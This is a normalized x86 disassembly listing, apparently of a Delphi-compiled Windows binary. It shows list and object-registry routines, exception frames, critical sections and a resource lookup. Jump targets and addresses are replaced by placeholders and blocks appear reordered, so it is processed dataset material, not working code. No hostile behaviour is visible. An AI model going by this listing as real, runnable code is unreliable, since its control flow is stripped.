push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_41a238
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_418f84
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_419438
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_4190b0
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_41a238
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_41947c
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_4194ff
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_40319c
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419506
lea eax [ ebp - 0x10c ]
call sub_403f9c
retn
sub_41950c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4193f4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_418f18
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_41947c
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_41a238
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41a238
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403478
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4193f4
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41a128
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_41a0dc
sub_4195f8
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_41a238
mov edx ebp
call sub_4191fc
test al al
jne r-xdata
sub_41963c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_418ff4
mov edx eax
mov eax [ edi + 0x4 ]
call sub_41a0dc
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_41a238
mov eax [ eax + 0xc ]
mov edx ebp
call sub_41a294
test eax eax
jge r-xdata
sub_419698
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41a238
mov esi eax
mov edx ebp
mov eax esi
call sub_419234
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_40324c
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41a128
sub_4196e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_40321c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_4195d4
xor eax eax
push ebp
push sub_4197e7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403570
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4197ee
mov eax [ rw-data ]
call sub_41968c
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41a0dc
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_41a238
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_419110
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41a0dc
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_41a238
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_4197ee
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_419814
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_40324c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40323c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_419844
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_4195d4
xor edx edx
push ebp
push sub_4198bb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41968c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_403a84
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_41a238
mov edx [ ebp - 0x4 ]
call sub_4190b0
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4198d8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_419938
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41993f
lea eax [ ebp - 0xc ]
call sub_403f9c
retn
sub_419944
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4195d4
xor eax eax
push ebp
push sub_41998a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_419438
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419991
mov eax [ rw-data ]
call sub_41968c
retn
sub_419998
push ebx
push esi
mov esi eax
mov eax esi
call sub_419944
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_4198d8
sub_4199b8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4195d4
xor eax eax
push ebp
push sub_419a1d
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4195f8
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4195e0
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419a24
mov eax [ rw-data ]
call sub_41968c
retn
mov eax ebx
call sub_4031d8
mov ebx eax
sub_419a28
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4195d4
xor eax eax
push ebp
push sub_419a6a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_419698
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419a71
mov eax [ rw-data ]
call sub_41968c
retn
sub_419a74
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4195d4
xor eax eax
push ebp
push sub_419ab6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_41963c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419abd
mov eax [ rw-data ]
call sub_41968c
retn
sub_419ac0
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_4195d4
xor eax eax
push ebp
push sub_419b07
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_41950c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419b0e
mov eax [ rw-data ]
call sub_41968c
retn
sub_419b14
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4195d4
xor eax eax
push ebp
push sub_419b62
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_4192d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419b69
mov eax [ rw-data ]
call sub_41968c
retn
sub_419bc8
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403570
pop ebp
retn 0x8
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_419c00
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_419bc8
mov edx eax
mov eax [ rw-data ]
call sub_41a51c
pop edi
pop esi
pop ebx
retn
sub_419c2c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_41a5a4
mov esi eax
xor edx edx
push ebp
push sub_419c96
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41a608
retn
mov edx ebx
mov eax esi
call sub_41a238
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403a84
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419ca8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_408080
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_419ce8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_403ff0
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_419d2c
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_41a294
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_41a0dc
sub_419d84
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_41a238
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_419dc4
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_419d84
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_419de8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_40445c
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c708
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419e5c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_41c208
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40324c
retn
sub_419e6c
push ebx
call sub_406118
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_406118
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_41a0dc
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov ebx eax
call sub_406118
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov ebx eax
call sub_406118
mov [ eax + 0xc ] ebx
sub_419ec4
push ebx
push esi
push edi
call sub_406118
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_41a238
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_419ef4
push ebx
push esi
call sub_406118
mov eax [ eax + 0x8 ]
call sub_40324c
call sub_406118
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_41a320
mov esi eax
call sub_406118
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_41a128
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_406118
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_40324c
sub_419f50
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_419fe6
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419fed
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4031d8
call sub_419f50
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_40319c
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404200
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_4053ac
call sub_4053fc
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_419de8
or bl al
sub_419ff8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41a0a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_41a087
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_403194
call sub_419f50
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_419e6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a08e
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_419ec4
retn
call sub_419ef4
sub_41a0bc
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_41a0dc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41a128
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41a1c4
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4029b0
mov edx esi
mov eax ebx
call sub_41a238
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41a18c
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_41a188
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
jmp sub_4039d8
sub_41a1c4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_41a20c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405eac
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_41a18c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a213
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_41a238
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41a1c4
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_41a260
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_41a39c
retn
sub_41a294
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_41a2b4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41a1c4
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4029b0
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41a32c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41a1c4
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41a37c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41a294
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_41a128
sub_41a39c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41a1c4
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_4027f4
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_41a3d8
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41a1c4
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_41a39c
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402c58
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_41a128
dec ebp
inc edi
jne r-xdata
sub_41a44c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40321c
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_41a4a0
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4035d8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41a5a4
xor eax eax
push ebp
push sub_41a502
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_40324c
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_40323c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a509
mov eax [ ebp - 0x4 ]
call sub_41a608
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_41a51c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41a5a4
xor eax eax
push ebp
push sub_41a598
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41a0dc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41a294
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a59f
mov eax [ ebp - 0x4 ]
call sub_41a608
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_41a1c4
sub_41a5b8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41a5a4
xor eax eax
push ebp
push sub_41a5fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41a37c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a602
mov eax [ ebp - 0x4 ]
call sub_41a608
retn
sub_41a614
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a668
mov edx ebx
and dl 0xfc
mov eax esi
